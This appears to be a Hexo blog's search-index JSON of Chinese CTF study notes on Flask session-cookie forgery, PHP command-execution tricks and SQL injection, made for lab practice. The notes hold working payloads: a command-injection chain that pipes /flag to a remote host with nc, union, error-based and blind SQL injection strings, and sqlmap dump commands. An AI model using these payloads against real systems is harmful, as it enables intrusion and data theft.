[{"title":"flask_session伪造","url":"/2025/02/27/flask-session%E4%BC%AA%E9%80%A0/","content":"flask_session伪造python3 session_encode.py encode -s &#x27;secret_key&#x27; -t &quot;&#123;内容&#125;&quot;\n\npython3 session_decode.py (session)\n\nsession伪造工具：https://github.com/noraj/flask-session-cookie-manager\n[CISCN2019 华东南赛区]Web41url参数返回了百度的页面 猜测存在任意文件读取，尝试读取文件&#x2F;etc&#x2F;passwd\n查看当前进程：&#x2F;proc&#x2F;self&#x2F;cmdline\n\n是python的后台，源码在app.py里面，尝试读取源码\nencoding:utf-8import re, random, uuid, urllibfrom flask import Flask, session, requestapp = Flask(__name__)random.seed(uuid.getnode())app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)app.debug = True@app.route(&#x27;/&#x27;)def index():    session[&#x27;username&#x27;] = &#x27;www-data&#x27;    return &#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;@app.route(&#x27;/read&#x27;)def read():    try:        url = request.args.get(&#x27;url&#x27;)        m = re.findall(&#x27;^file.*&#x27;, url, re.IGNORECASE)        n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)        if m or n:            return &#x27;No Hack&#x27;        res = urllib.urlopen(url)        return res.read()    except Exception as ex:        print str(ex)    return &#x27;no response&#x27;@app.route(&#x27;/flag&#x27;)def flag():    if session and session[&#x27;username&#x27;] == &#x27;fuck&#x27;:        return open(&#x27;/flag.txt&#x27;).read()    else:        return &#x27;Access denied&#x27;if __name__==&#x27;__main__&#x27;:    app.run(        debug=True,        host=&quot;0.0.0.0&quot;    )\n\nandom指定了seed那么生成的随机数是固定的\n\n&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 获得mac地址\nimport uuidimport randommac = &quot;c6:bc:6b:39:0a:98&quot;temp = mac.split(&#x27;:&#x27;)temp = [int(i,16) for i in temp]temp = [bin(i).replace(&#x27;0b&#x27;,&#x27;&#x27;).zfill(8) for i in temp]temp = &#x27;&#x27;.join(temp)mac = int(temp,2)random.seed(mac)randStr = str(random.random()*233)print(randStr)\n\npython3 session_decode.py eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48pCw.jSI45FJchx1e5pmIMuxPxvo4m9E&#123;&#x27;username&#x27;: b&#x27;www-data&#x27;&#125;\n\npython3 session_encode.py encode -s &#x27;210.13041538&#x27; -t &quot;&#123;&#x27;username&#x27;: b&#x27;fuck&#x27;&#125;&quot;eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Z8AYEw.fdcMuLO1YdleiT3Z4OgQ8pc8qoE\n\n传入eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Z8AYEw.fdcMuLO1YdleiT3Z4OgQ8pc8qoE得flag\n"},{"title":"Hello World","url":"/2025/02/22/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"rce","url":"/2025/02/24/rce/","content":"rce一些命令常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()\n无参数函数print_r()、scandir()与highlight_file(‘);\ncat tac more less tail uniq od nl grep sort xxd strings\n\nxxd:读取二进制文件     od:以二进制读取   \ngrep (查找字段,flag) /flag\n\nob_start函数会接收我们往流里输入的参数\n&lt;?php$cmd = &#x27;system&#x27;;ob_start($cmd);echo &quot;whoami&quot;;ob_end_flush();?&gt;\n\n执行system(‘whoami’)\n长度限制前置知识：\n\n和&gt;&gt;：\n\n\nb 类似于touch b，即直接创建文件b，通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容\n\necho kuai &gt; a  #创建文件a，并把字符串’kuai’写入到文件a里\n\n\n用来追加内容\n\n\nkuai &gt;&gt;a   #在文件a末尾追加字符串’kuai’\nls -t命令：按时间顺序，由近及远排序（后创建的排在前面，只能精确到秒）\n组合运用示例:#&gt;ag\n#&gt;fl#&gt;”t”#&gt;ca#ls -tca ‘t ‘ fl ag\n按时间顺序反向依次创建文件，”ca” “‘t “ “fl” “ag”再通过ls -t &gt; x，创建文件x，并把’Is -t执行结果写入文件x里 。\n实际上在创建文件时，加入”&quot;，把命令”ca””t””f””ag”连接起来\n#&gt;ag#fl\\#&gt;”t\\“#&gt;ca\\#ls -t &gt; a       \n前面的‘\\’把后面的‘\\’实体化变成字符 ，把一段已经拼接好的文件名输出到输出到一个文件a里，然后把这个文件a当成一个脚本去执行\nsh：sh命令是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取\ndir及*：*：相当于$(dir *)\n#dir *echo ffff#$(dir )ffff            &#x2F;&#x2F;执行echo命令输出ffff#ffff            &#x2F;&#x2F;执行echo命令输出ffff\n如果第一个文件名是命令的话就会执行命令,返回执行的结果，之后的文件名作为参数传入 \nrev:翻转文件每一行内容\n长度限制为7绕过方法：期望执行的命令：\ncat &#x2F;flag|nc 192.168.1.124 7777   \ncat &#x2F;flag展示内容，再通过nc反弹提交到192.168.1.124:7777，kali的IP地址192.168.1.124监听端口7777 \n去kali把监听打开 ：\nnc -lvp 7777\n 利用逻辑：\n\n创建短的文件名Is -t 按时间顺序列出文件名，按行储存\\连接换行命令sh从文件中读取命令\n\n?cmd&#x3D;&gt;7777\n?cmd&#x3D;&gt;\\ \\\n?cmd&#x3D;&gt;&gt;124\\\n?cmd&#x3D;&gt;1.\\\n?cmd&#x3D;&gt;168.\\\n?cmd&#x3D;&gt;192.\\\n?cmd&#x3D;&gt;c\\ \\\n?cmd&#x3D;&gt;|n\\\n?cmd&#x3D;&gt;flag\\\n?cmd&#x3D;&gt;t\\ \\\n?cmd&#x3D;&gt;ca\\    #从近往远的文件名能构成命令cat &#x2F;flag|nc 192.168.1.124 7777?cmd&#x3D;ls -t&gt;a   #将文件名按从近往远的顺序写入到文件a\n无数字字母自增"},{"title":"笔记","url":"/2025/02/24/sql/","content":"Sql空格-&gt;%09\n&#x3D;-&gt;like\nand-&gt;&amp;&amp;\nillegal mix of collation operation ‘UNION’\n这个错误意味着在UNION查询中的两个或多个列使用了不同的字符集或校对规则，导致无法进行正确的合并 操作。 解决方法：统一字符集和校对规则，在sql语句from前添加COLLATE utf8_general_ci\nsql语句加锁，有个提示用户只能从nss来的\n所以sql语句后加where user &#x3D; ‘nss’\n‘ - ‘ 被过滤了所以用100使前面查询不出内容，得到库名\n堆叠注入(emm，博客里说过滤了select就是堆叠)\n以;结束命令再在后面加命令一起执行，（这么说所有都可以用堆叠注入喽?）\n补：不是，有什么API巴拉巴拉的限制，可能不行\n命令:\n查数据库(感觉没啥用，爆表会默认当前数据库): 1’; show databases;\n查表: 1’; show tables;\n爆表: *1’;show columns from *(*表名)*;#\n(表名为数字加  )\n查字段(select被禁)：[强网杯 2019]随便注1\n1’;Handler 1919810931114514 OPEN;Handler 1919810931114514 read first;Handler 1919810931114514 close;#\n1’; handler 1919810931114514 open as a; handler a read next;#\n报错注入获取数据库名\n1’ and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+\n不太稳定，嗯\n1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+\n1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+\n1’or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n表\n1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’ ),’^’),1) –+\n1’or(updatexml(1,concat(‘^’,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),’^’),1))\n若超过一行则在table_schema&#x3D;’security’后面加limit 0，1，意思是只显示第一行\nLimit 1，1   2，1   3，1往下一行看\n列\n1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’ limit 0,1 ),’^’),1) –+\n1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))#\n字段\n1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+       只得到了一段\n1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#\n字段       表\n1’ and extractvalue(1,concat(‘^’,(select substring(group_concat(id,’^’,flag),31,30) from test_tb)))#          第二段,31,30意思是从第31个字符往后提取30个字符，可改\n联合注入新生赛wp(现在看应该是数字型，那为什么能直接用呢？还是说是单引号型，只是碰巧)\n先分别输入1，2，3，4，5，到5就不行了，所以有4段，再使用特定语句走流程\n查段数 1’ order by 3#\n1.   ‘ union select 1,2,3 – ‘\n2.   检查数据库信息’ union select 1, 2,3， @@version – ‘\n3.   查询数据库名’ union select 1, 2,3， database() – ‘\n4.   查用户权限’ union select 1, 2, 3，user() – ‘\n5.   查表1’ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()# \n6.   爆表’ union select 1, 2,3, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctf’– ‘\n7.      \n8.   爆列’ union select 1, 2,3, group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag’ – ‘\n9.   查flag’ union select 1,2, group_concat(data) from flag– ‘\n1’ union select 1,2,group_concat(flag) from ctf.Flag\n1’ union select 1,2,group_concat(字段名) from 数据库名.表名\n布尔盲注刚看了布尔盲注，我勒个盲注啊，全用二分法一个个试啊，眉头一下子就皱起来了，好麻烦，很哈人，直到看到博主说：一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。把语句记下，去找工具了。\n1．数据库类型\n **&#x2F;&#x2F;**判断是否是 Mysql数据库\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select*from information_schema.tables) –+\n&#x2F;&#x2F;判断是否是 access数据库\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select*from msysobjects) –+\n&#x2F;&#x2F;判断是否是 Sqlserver数据库\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select*from sysobjects) –+\n2．数据库名\n1：判断当前数据库的长度，利用二分法\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length(database())&gt;5 –+ &#x2F;&#x2F;正常显示\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length(database())&gt;10 –+ &#x2F;&#x2F;不显示任何数据\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length(database())&gt;7 –+ &#x2F;&#x2F;正常显示\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length(database())&gt;8 –+ &#x2F;&#x2F;不显示任何数据\n 大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符\n2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断\n&#x2F;&#x2F;判断数据库的第一个字符\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr(database(),1,1))&gt;115 –+ &#x2F;&#x2F;100为ascii表中的十进制，对应字母s\n&#x2F;&#x2F;判断数据库的第二个字符\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr(database(),2,1))&gt;100 –+\n&#x2F;&#x2F;判断数据库的第三个字符\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr(database(),3,1))&gt;100 –+\n………..\n由此可以判断出当前数据库为 security\n3．库的表名\n&#x2F;&#x2F;猜测当前数据库中是否存在admin表\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select*from admin) –+\n1：判断当前数据库中表的个数\n&#x2F;&#x2F; 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;3 –+\n2：判断每个表的长度\n&#x2F;&#x2F;判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;6 –+\n&#x2F;&#x2F;判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;6 –+\n3：判断每个表的每个字符的ascii值\n&#x2F;&#x2F;判断第一个表的第一个字符的ascii值\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 –+\n&#x2F;&#x2F;判断第一个表的第二个字符的ascii值        \nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;100 –+\n由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断\n4.表的字段\n&#x2F;&#x2F;如果已经证实了存在admin表，那么猜测是否存在username字段\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and exists(select username from admin) \n1：判断表中字段的个数\n&#x2F;&#x2F;判断users表中字段个数是否大于5\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’)&gt;5 –+\n2：判断每个字段的长度\n&#x2F;&#x2F;判断第一个字段的长度\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1))&gt;5 –+\n&#x2F;&#x2F;判断第二个字段的长度  \nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1))&gt;5 –+\n3：判断每个字段名字的ascii值\n&#x2F;&#x2F;判断第一个字段的第一个字符的ascii\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100 –+\n&#x2F;&#x2F;判断第一个字段的第二个字符的ascii\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),2,1))&gt;100 –+\n………..\n由此可判断出users表中存在 id、username、password 字段\n5.字段数据\n我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据\n1: 判断数据的长度\n&#x2F;&#x2F; 判断id字段的第一个数据的长度\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select id from users limit 0,1))&gt;5 –+\n&#x2F;&#x2F; 判断id字段的第二个数据的长度\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and length((select id from users limit 1,1))&gt;5 –+\n2：判断数据的ascii值\n&#x2F;&#x2F; 判断id字段的第一行数据的第一个字符的ascii值\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select id from users limit 0,1),1,1))&gt;100 –+\n&#x2F;&#x2F; 判断id字段的第二行数据的第二个字符的ascii值\nhttp://127.0.0.1/sqli/Less-5/?id=1‘ and ascii(substr((select id from users limit 0,1),2,1))&gt;100 –+\n时间盲注和布尔盲注差不多，布尔是直接显示对错，时间以延迟表示对错，比布尔还麻烦\nhttp注入只是换了个地方注入，ua，xff，cookie等\nsqlmap快速入门；SQLmap（常规）使用步骤\n1、检测「注入点」\nsqlmap -u ‘http://xx/?id=1‘\n1\n2、查看所有「数据库」\nsqlmap -u ‘http://xx/?id=1‘ –dbs\n1\n3、查看当前使用的数据库\nsqlmap -u ‘http://xx/?id=1‘ –current-db\n1\n4、查看「数据表」\nsqlmap -u ‘http://xx/?id=1‘ -D ‘security’ –tables\n1\n5、查看「字段」\nsqlmap -u ‘http://xx/?id=1‘ -D ‘security’ -T ‘users’ –tables\n1\n6、查看「数据」\nsqlmap -u ‘http://xx/?id=1‘ -D ‘security’ -T ‘users’ –dump\n"}]